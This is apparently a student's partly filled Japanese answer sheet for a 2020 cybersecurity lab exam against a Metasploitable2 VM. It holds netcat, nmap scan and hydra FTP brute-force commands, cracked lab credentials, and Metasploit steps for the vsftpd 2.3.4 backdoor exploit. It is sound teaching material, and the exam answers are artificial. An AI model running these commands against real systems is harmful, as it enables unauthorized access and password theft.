# CyberSecurity I Exam 2020 回答用紙

[ip]
kali: 192.168.33.10
metasploitable2: 192.168.33.5

## 問1 [netcat]

### サーバー側コマンド

```sh
# ここに回答を記述
nc -lvp 5000
```
### クライアント側コマンド
 
```sh
# ここに回答を記述
nc 192.168.33.5(server ip) 5000
```

## 問2 [Password Crack]

```md
<!--  ここに回答を記述 -->
- omas:itcollege
- omas2:foobar
```

## 問3 [Port Scanner]

### 1. ping scan

```sh
# ここに回答を記述
nmap -sP 192.168.33.0/25

```

### 2. version scan

```sh
# ここに回答を記述
nmap -sV -p- 192.168.33.5
```

## 問4 [Metasploit Framework]

```sh
# ここに回答を記述
msfconsole
search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
show options
set RHOST 192.168.33.5
run
```

## 問5 [Online Password Cracker]
hydra -L user.list -P passwd.list -t 64 192.168.33.5 ftp

### 1. コマンド

```sh
# ここに回答を記述

```

### 2. 解析結果

```sh
# ここに回答を記述

```

## 問6 [Packet Sniffer]

```sh
# ここに回答を記述

```

## 問7 [不正アクセス]

### 1. rootアクセスの件数

```md
<!--  ここに回答を記述 -->

```

### 2. 不正アクセスユーザーのTOP3

```md
<!--  ここに回答を記述 -->

```
### 3. IPアドレスのアクセス件数と発信国

```md
<!--  ここに回答を記述 -->

```

## 問8 [自己評価]

```md
<!--  ここに回答を記述 -->

```

## 問9 [講義の感想]

```md
<!--  ここに回答を記述 -->

```
